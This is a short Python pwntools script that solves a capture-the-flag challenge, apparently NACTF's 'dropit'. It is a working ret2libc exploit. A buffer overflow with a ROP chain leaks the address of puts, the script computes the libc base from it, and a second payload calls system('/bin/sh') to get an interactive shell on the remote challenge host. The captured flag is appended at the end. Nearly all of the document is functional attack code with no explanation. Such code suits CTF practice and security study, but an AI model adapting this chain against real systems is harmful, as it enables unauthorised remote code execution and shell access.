from pwn import *

elf = ELF("dropit")
rop = ROP("dropit")
libc = ELF("libc6_2.32-0ubuntu2_amd64.so")
offset = 56
context.arch = 'amd64'
r = remote("challenges.ctfd.io", 30261)

print()

log.info("leaking libc...")

payload = b'A' * offset
payload += p64(rop.find_gadget(['pop rdi', "ret"])[0])
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.sym['main'])
r.recvuntil("?\n")
r.sendline(payload)

puts = u64(r.recv(8).ljust(8, b'\x00'))
libc_base = puts - libc.sym['puts']
log.success("libc_base --> %s", hex(libc_base))
system = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))
log.info("libc leaked\n\n")

payload = b'A' * offset
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(rop.find_gadget(['pop rdi', "ret"])[0])
payload += p64(bin_sh)
payload += p64(system)

r.recvuntil("?\n")
r.sendline(payload)
r.interactive()

# FLAG --> nactf{r0p_y0ur_w4y_t0_v1ct0ry_698jB84iO4OH1cUe}
